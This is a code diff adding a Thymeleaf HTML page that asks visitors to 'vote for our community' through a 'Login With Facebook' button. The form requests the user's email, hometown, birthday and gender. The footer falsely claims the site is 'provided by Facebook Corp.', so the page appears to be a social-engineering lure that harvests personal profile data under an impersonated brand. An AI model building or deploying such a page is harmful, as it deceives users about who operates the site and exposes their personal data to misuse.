@@ -1,0 +1,47 @@
+<!DOCTYPE HTML>
+<html xmlns:th="http://www.thymeleaf.org">
+ <head>
+    <title>Community</title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <link rel="stylesheet" href="/resources/static/css/bootstrap.css"  />
+    <link rel="stylesheet" href="/resources/static/css/style.css"  />
+    <link rel="icon"  type="image/x-icon"  href="/resources/static/images/favicon.png"  />
+    
+</head>
+<body>
+
+       <div class="container">
+				  <div class="row">
+				    <div class="span12">
+				      <div class="hero-unit center" style="margin-top: 25% !important;">
+					          <h1>A Community <small><font face="Tahoma" color="red">2018</font></small></h1>
+					          <br />
+					          <p>Give your voice and vote for our community and click this <b>button</b></p>
+					          <p><b></b></p>
+					           <form action="/facebook" method="POST">
+								   <input type="hidden" name="scope" value="email,user_hometown,user_birthday,user_gender" />
+								   <div><p>You aren't connected to Facebook yet.</p></div>
+								   <p><button type="submit" class="btn btn-info">Login With Facebook</button></p>
+								</form>
+				         </div>
+				    </div>
+				  </div>
+		   </div>
+		   
+		   
+		 <div class="content-footer" > 
+			    <div class="copyright"   style="margin-top: 25% !important;" >
+					<p>
+					     <i> This site is provided by Facebook Corp. <span id="year"></span></i> 
+					     
+					</p>
+					<script type="text/javascript">
+					   document.getElementById("year").innerHTML = new Date().getUTCFullYear();
+					</script>
+			   </div> 
+          </div> 
+
+    <script type="text/javascript"  src="/resources/static/js/jquery.js"></script>
+    <script type="text/javascript"  src="/resources/static/js/bootstrap.js"></script>
+</body>
+</html>
